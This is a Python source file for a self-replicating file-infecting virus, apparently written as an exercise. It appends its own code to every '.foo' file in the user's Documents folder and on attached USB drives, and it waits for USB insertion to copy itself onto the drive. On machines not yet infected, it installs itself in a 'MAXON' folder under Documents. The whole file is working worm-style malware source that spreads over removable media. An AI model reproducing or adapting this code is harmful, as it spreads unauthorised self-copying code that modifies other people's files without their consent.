import os
import shutil
import time
import getpass
import platform
import subprocess
import psutil
 

class VProgram:
    def __init__(self):
        self.creator_signature = "YYUUUUppppp@ayanakoji"
    
    def get_content_of_V_program(self):
        try:
            with open(__file__, 'r', encoding='utf-8', errors='ignore') as file:
                return file.read()
        except Exception as e:
            print(f"Error in get_content_of_V_program: {e}")
            return ""
        

    def get_os_and_user_info(self):
        try:
            operating_system = platform.system()
            user_account = getpass.getuser()
            return operating_system, user_account
        except Exception as e:
            print(f"Error in get_os_and_user_info: {e}")
            return None, None

    def infect_the_foo_files(self, folder_path, extension, content_to_append):
        try:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    if file.endswith(extension):
                        file_path = os.path.join(root, file)

                        # Check if the content is already present in the file
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file_to_check:
                            file_content = file_to_check.read()
                            if content_to_append in file_content:
                                print(f"Content already present in {file_path}. Skipping...")
                                continue

                        # If the content is not present, append it to the file
                        with open(file_path, 'a', encoding='utf-8', errors='ignore') as file_to_modify:
                            file_to_modify.write(content_to_append)
        except Exception as e:
            print(f"Error in infect_the_foo_files: {e}")




    def search_and_infect_foo_files_on_usb(self, extension, content_to_append):
        while True:
            try:
                usb_drives = self.get_usb_drives()

                if usb_drives:
                    for usb_drive in usb_drives:
                        usb_drive_path = os.path.join(usb_drive, "")
                        print(f"USB drive detected: {usb_drive}, Path: {usb_drive_path}")
                        self.infect_the_foo_files(usb_drive_path, extension, content_to_append)
                    break

                print("Waiting for USB insertion...")
                time.sleep(5)  # Wait for 5 seconds before checking again
            except Exception as e:
                print(f"Error in search_and_infect_foo_files_on_usb: {e}")

    def create_copy_on_usb(self, usb_drive):
        try:
            destination_file = os.path.join(usb_drive, "V.py")
            shutil.copy(__file__, destination_file)
        except Exception as e:
            print(f"Error in create_copy_on_usb: {e}")

    def is_usb_drive(self, drive):
        try:
            if platform.system() == 'Darwin':    
                output = subprocess.check_output(['diskutil', 'info', drive])
                return b'External' in output and b'USB' in output
            elif platform.system() == 'Linux':
                 return drive.startswith('/media') or drive.startswith('/mnt')
        except Exception as e:
            print(f"Error in is_usb_drive: {e}")
            return False

    def get_usb_drives(self):
        try:
            usb_drives = []
            
            if platform.system() == "Windows":
               import win32file # uncomment/comment it for windows/unix
               drives = [chr(i) + ":" for i in range(65, 91) if win32file.GetDriveType(chr(i) + ":") == win32file.DRIVE_REMOVABLE]
               usb_drives = [drive for drive in drives]

            elif platform.system() == "Darwin":  # macOS
                for drive in os.listdir('/Volumes'):
                    if not drive.startswith('.'):
                        disk_path = os.path.join('/Volumes', drive)
                        if os.path.ismount(disk_path) and self.is_usb_drive(drive):
                            usb_drives.append(disk_path)

            elif platform.system() == "Linux":
                 mounts_file = '/proc/mounts'
                 if os.path.exists(mounts_file):
                    with open(mounts_file, 'r') as mounts:
                        for line in mounts:
                            parts = line.split()
                            drive_path = parts[1]
                            if self.is_usb_drive(drive_path):
                                usb_drives.append(drive_path)

            return usb_drives
        except Exception as e:
            print(f"Error in get_usb_drives: {e}")
            return []


    def get_program_path_in_documents_folder(self):
        try:
            documents_folder = os.path.join(os.path.expanduser("~"), "Documents")
            specified_directory = os.path.join(documents_folder, "MAXON")
            return os.path.join(specified_directory, "V.py")
        except Exception as e:
            print(f"Error in get_program_path_in_documents_folder: {e}")
            return ""

    def copy_to_new_computer(self):
        try:
            if self.is_new_computer():
                documents_folder = os.path.join(os.path.expanduser("~"), "Documents")
                specified_directory = os.path.join(documents_folder, "MAXON")
                os.makedirs(specified_directory, exist_ok=True)

                # Change the destination file name as needed
                destination_file = os.path.join(specified_directory, "V.py")

                shutil.copy(__file__, destination_file)
            else:
                print('Not a new comp to copy from usb to doc folder')    
        except Exception as e:
            print(f"Error in copy_to_new_computer: {e}")

    def is_new_computer(self):
        try:
            return not os.path.exists(self.get_program_path_in_documents_folder())
        except Exception as e:
            print(f"Error in is_new_computer: {e}")
            return False

    def detect_creator(self):
        try:
            # Replace with the actual creator's operating system and username
            creator_os = "Darwin"  # e.g., "Windows", "Darwin", "Linux"
            creator_username = "abhishek"  # Replace with the actual creator's username

            current_os, current_username = self.get_os_and_user_info()

            return current_os == creator_os and current_username == creator_username
        except Exception as e:
            print(f"Error in detect_creator: {e}")
            return False

if __name__ == "__main__":
    v_program = VProgram()
    extension = ".foo"
    content_to_append = v_program.get_content_of_V_program()
    # 1. Determine the operating system and the user account.
    operating_system, user_account = v_program.get_os_and_user_info()
    print(f"Operating System: {operating_system}, User Account: {user_account}")

    # 2. Access the documents folder of the user account.
    documents_folder = os.path.join(os.path.expanduser("~"), "Documents")

    # 7. Detect the original creator of the V program.
    if v_program.detect_creator():
        print("This is the original creator's computer.\n")
        # v_program.infect_the_foo_files(documents_folder,extension ,content_to_append )
        print("Infect the foo files of Creator's computer")
        v_program.infect_the_foo_files(documents_folder, extension, content_to_append)
        
        # 1b. Further, search for USB drives and copy to them.
        print('\nInfecting the foo files on the usb inserted in Creators computer\n')
        v_program.search_and_infect_foo_files_on_usb(extension ,content_to_append)
        
        # 6. Create a copy of 'V' on the USB drive.
        for usb_drive in v_program.get_usb_drives():
             v_program.create_copy_on_usb(usb_drive)
             print("\nMy foo virus creates a copy of itself on the Usb:"+usb_drive+" inserted in the Creator's computer")
    else:
        print("This is not the original creator's computer.\n")
        if(v_program.is_new_computer() == True):
           print("It is a new computer to infect\n")
            
        # 1c. When this USB drive is inserted in a new computer, copy to a specified directory.
           v_program.copy_to_new_computer()
           print("\nV.py successfully copied to specified folder of document folder of new computer")
       
        else:
            print("This is already a infected computer.\n")

            print("Infect the foo files of infected computer\n")
            v_program.infect_the_foo_files(documents_folder, extension, content_to_append)
            
        # 1b. Further, search for USB drives and copy to them.
            print('Infecting the foo files on the usb inserted in infected computer\n')
            v_program.search_and_infect_foo_files_on_usb(extension ,content_to_append)
            
        # 6. Create a copy of 'V' on the USB drive.
            for usb_drive in v_program.get_usb_drives():
                v_program.create_copy_on_usb(usb_drive)
                print("My foo virus creates a copy of itself on the Usb:"+usb_drive+" inserted in the infected computer")

        
        
